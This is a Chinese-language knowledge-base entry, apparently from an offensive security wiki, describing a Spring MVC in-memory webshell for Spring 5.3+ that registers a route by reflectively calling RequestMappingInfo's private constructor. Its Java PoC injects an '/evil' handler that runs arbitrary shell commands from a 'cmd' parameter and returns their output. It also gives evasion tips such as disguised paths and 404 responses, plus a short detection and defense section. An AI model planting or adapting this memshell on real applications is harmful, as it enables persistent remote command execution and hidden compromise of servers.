---
id: web-java-framework-spring-mvc-pathpattern-memshell
title: 新版 Spring MVC PathPatternsRequestCondition 动态路由内存马
type: scenario
domain: web
path: web/java/framework/spring
technique: spring-mvc-pathpattern-dynamic-route-memshell
tags:
- spring
- spring-mvc
- springboot
- memshell
- pathpattern
- requestmapping
- dynamic-route
- persistence
- java
cve: []
severity: critical
confidence: high
status: verified
affected_versions: Spring Framework 5.3+（原文；PathPatternsRequestCondition 默认启用）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:12:37+08:00'
  notes: 已对照原文与图03/04核对：图03 显示公共构造器生成的 RequestMappingInfo 为 pathPatternsCondition=null、patternsCondition 已设置；正文证实新版请求使用 ServletRequestPathUtils.PATH 导致旧匹配报 UrlPathHelper.PATH 缺失。改为反射十参私有构造器 + PathPatternsRequestCondition 后，图04 的 /evil?cmd=dir 成功执行。原文明确 Spring 5.3 起默认 PathPatternsRequestCondition，affected_versions 保留。未执行 PoC。
url: /docs/web/java/framework/spring/web-java-framework-spring-mvc-pathpattern-memshell/
draft: false
kb_aliases:
- SpringBoot 新版内存马
- PathPatternsRequestCondition 内存马
- PathPatternParser 动态路由
- RequestMappingInfo 反射构造
- Spring 5.3 内存马
---

## 一句话结论

在 Spring 5.3+ / 新版 Spring Boot 中，旧式 `PatternsRequestCondition` 的 `RequestMappingInfo` 会因请求缺少 `UrlPathHelper.PATH` 属性而匹配失败；改用反射调用 `RequestMappingInfo` 的私有十参构造器，构造带 `PathPatternsRequestCondition` 的映射，再 `registerMapping`，即可在运行期注册可用的 Controller 内存马。

## 原理

- Spring MVC 启动时由 `RequestMappingHandlerMapping.afterPropertiesSet()` → `initHandlerMethods()` 扫描 `@Controller`/`@RequestMapping`，把 `RequestMappingInfo → HandlerMethod` 放入内部映射表；运行期仍可通过 `registerMapping(RequestMappingInfo, Object handler, Method method)` 新增映射。
- 请求匹配由 `RequestMappingInfo.getMatchingCondition()` 完成，它同时检查 `pathPatternsCondition`（新解析器）与 `patternsCondition`（旧解析器）。Spring 5.3+ 默认使用 `PathPatternParser`/`PathPatternsRequestCondition`，请求处理过程中设置的是 `org.springframework.web.util.ServletRequestPathUtils.PATH` 属性。
- 旧内存马代码用 `new RequestMappingInfo(PatternsRequestCondition, ...)` 等公共构造器，只能创建 `patternsCondition != null`、`pathPatternsCondition == null` 的对象。反序列化/请求匹配走到 `PatternsRequestCondition.getMatchingCondition()` → `UrlPathHelper.getResolvedLookupPath(request)` 时，会读取 `org.springframework.web.util.UrlPathHelper.PATH`；新版请求中不存在该属性，于是抛 `IllegalArgumentException: Expected lookupPath in request attribute "org.springframework.web.util.UrlPathHelper.PATH"`。
- `RequestMappingInfo` 的公共构造器都固定把 `PathPatternsRequestCondition` 传成 `null`；真正接受新解析器的十参构造器是 `private` 的。攻击者用反射取得该构造器并 `setAccessible(true)`，传入 `new PathPatternsRequestCondition(new PathPatternParser(), "/evil")`，即可构造出 `pathPatternsCondition != null` 的映射。
- 该对象注册后，`PathPatternsRequestCondition.getMatchingCondition()` 直接按新路径解析器匹配 `/evil`，不再依赖缺失的 `UrlPathHelper.PATH`，请求因此能命中恶意 handler。

## 触发条件

- 应用为 Spring MVC（Servlet）且版本约 5.3+ / 新版 Spring Boot，默认使用 `PathPatternParser`。
- 攻击者已获得任意 Java 代码执行能力（SpEL、反序列化、表达式注入、模板注入等），能执行任意类方法。
- 能获取当前 `WebApplicationContext` 与 `RequestMappingHandlerMapping` Bean；通常通过 `RequestContextHolder` 与 `DispatcherServlet.CONTEXT` 属性取得。
- 注册路径未被网关/全局安全过滤器完全拦截；目标 JDK 与执行环境允许反射访问 `RequestMappingInfo` 的私有构造器。

## 利用步骤

1. 在当前请求线程取得 `WebApplicationContext`：从 `RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0)` 获取。
2. `context.getBean(RequestMappingHandlerMapping.class)` 取得路由映射器。
3. 构造空的条件对象：`RequestMethodsRequestCondition`、`ParamsRequestCondition`、`HeadersRequestCondition`、`ConsumesRequestCondition`、`ProducesRequestCondition`、`RequestConditionHolder`、`RequestMappingInfo.BuilderConfiguration`。
4. 用 `PathPatternParser` + `PathPatternsRequestCondition(parser, "/evil")` 构造新路径条件。
5. 反射取得 `RequestMappingInfo` 的十参私有构造器，`setAccessible(true)` 后 `newInstance(null, url, null, methods, params, headers, consumes, produces, custom, option)`。
6. `requestMappingHandlerMapping.registerMapping(info, evilHandler, evilMethod)` 注册路由。
7. 访问 `GET /evil?cmd=whoami` 验证命令执行。

## PoC

```java
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.*;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.util.pattern.PathPatternParser;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.Scanner;

public class InjectController {
    public String inject() throws Exception {
        // 1. 取当前 WebApplicationContext 与 RequestMappingHandlerMapping
        WebApplicationContext context = (WebApplicationContext)
            RequestContextHolder.currentRequestAttributes().getAttribute(
                "org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mapping =
            context.getBean(RequestMappingHandlerMapping.class);

        Method method = Evil.class.getMethod("cmd");

        // 2. 构造空条件
        RequestMethodsRequestCondition methods =
            new RequestMethodsRequestCondition(new RequestMethod[0]);
        ParamsRequestCondition params = new ParamsRequestCondition(new String[0]);
        HeadersRequestCondition headers = new HeadersRequestCondition(new String[0]);
        ConsumesRequestCondition consumes = new ConsumesRequestCondition(new String[0]);
        ProducesRequestCondition produces = new ProducesRequestCondition(new String[0]);
        RequestConditionHolder custom = new RequestConditionHolder(null);
        RequestMappingInfo.BuilderConfiguration option =
            new RequestMappingInfo.BuilderConfiguration();

        // 3. 新解析器路径条件（关键：不能走公共构造器，否则 pathPatternsCondition=null）
        PathPatternParser parser = new PathPatternParser();
        PathPatternsRequestCondition url =
            new PathPatternsRequestCondition(parser, "/evil");

        // 4. 反射十参私有构造器
        Constructor<RequestMappingInfo> ctor =
            RequestMappingInfo.class.getDeclaredConstructor(
                String.class,                        // name
                PathPatternsRequestCondition.class,  // pathPatternsCondition
                PatternsRequestCondition.class,      // patternsCondition
                RequestMethodsRequestCondition.class,
                ParamsRequestCondition.class,
                HeadersRequestCondition.class,
                ConsumesRequestCondition.class,
                ProducesRequestCondition.class,
                RequestConditionHolder.class,
                RequestMappingInfo.BuilderConfiguration.class);
        ctor.setAccessible(true);
        RequestMappingInfo info = ctor.newInstance(
            null, url, null, methods, params, headers, consumes, produces, custom, option);

        // 5. 注册路由
        mapping.registerMapping(info, new Evil(), method);
        return "Inject ok";
    }

    public static class Evil {
        public void cmd() throws Exception {
            HttpServletRequest req = ((ServletRequestAttributes)
                RequestContextHolder.currentRequestAttributes()).getRequest();
            HttpServletResponse resp = ((ServletRequestAttributes)
                RequestContextHolder.currentRequestAttributes()).getResponse();
            String cmd = req.getParameter("cmd");
            if (cmd == null) return;
            boolean win = System.getProperty("os.name").toLowerCase().contains("win");
            String[] cmds = win
                ? new String[]{"cmd.exe", "/c", cmd}
                : new String[]{"sh", "-c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            resp.getWriter().write(s.hasNext() ? s.next() : "");
            resp.getWriter().flush();
            resp.getWriter().close();
        }
    }
}
```

```text
# 旧版代码（仅 patternsCondition）在新版会报：
# java.lang.IllegalArgumentException: Expected lookupPath in request attribute
# "org.springframework.web.util.UrlPathHelper.PATH".
#
# 新版请求属性实际是：
# org.springframework.web.util.ServletRequestPathUtils.PATH -> DefaultRequestPath("/evil")
```

## 变体与关联

- 变体：若目标仍是 Spring 5.3 之前、默认使用 `PatternsRequestCondition`，可直接用公共构造器 `new RequestMappingInfo(PatternsRequestCondition, ...)`，不需要反射。
- 变体：投递方式不限，可通过 SpEL `defineClass`、反序列化 `TemplatesImpl` 字节码、表达式注入等先获得代码执行，再执行上述注册逻辑；文章中的 CTF 用 `TemplatesImpl` 把注册逻辑放在 `AbstractTranslet` 子类构造器中。
- 变体：路径可伪装成静态资源或随机串，handler 内校验口令、错误时返回 404，降低被扫描发现的概率。
- 关联：[[web-java-framework-spring-mvc-dynamic-controller-memshell]]（动态注册 Controller 内存马的通用思路与 `defineClass` 投递）；[[web-java-expression-spel-restricted-reflection-memshell]]（SpEL 受限时的反射投递）。
- 边界：纯 WebFlux 不使用 `RequestMappingHandlerMapping` 的 Servlet 语义，需改用 WebFlux 的 `RequestMappingHandlerMapping`/`RouterFunction` 机制；若 `PathPatternParser` 被禁用（旧版本或显式配置 `PathMatchConfigurer` 使用 AntPathMatcher），旧构造器可能仍可用；目标对 `RequestMappingHandlerMapping` 做运行期新增映射告警时会被发现。

## 检测与防御

- 检测：对 `RequestMappingHandlerMapping` 的映射表做启动后基线，运行期新增路径（尤其带 `cmd` 参数、随机路径、静态资源伪装路径）告警；监控 `RequestMappingInfo` 私有构造器被反射调用、`PathPatternsRequestCondition`/`PathPatternParser` 在业务代码中出现。
- 修复：消除代码执行入口（SpEL、反序列化、模板注入等）；业务代码不应在运行期调用 `registerMapping`。
- 加固：用 Arthas/Java Agent 定期 dump `RequestMappingHandlerMapping` 映射表；对新增 handler 的类名、方法名、路径做白名单；限制 `setAccessible` 与反射调用（SecurityManager/JEP 411 替代方案）。
- 响应：重启进程可清除内存马；结合 heap dump 分析 `RequestMappingHandlerMapping` 中异常的 `HandlerMethod` 与其所属类加载器。
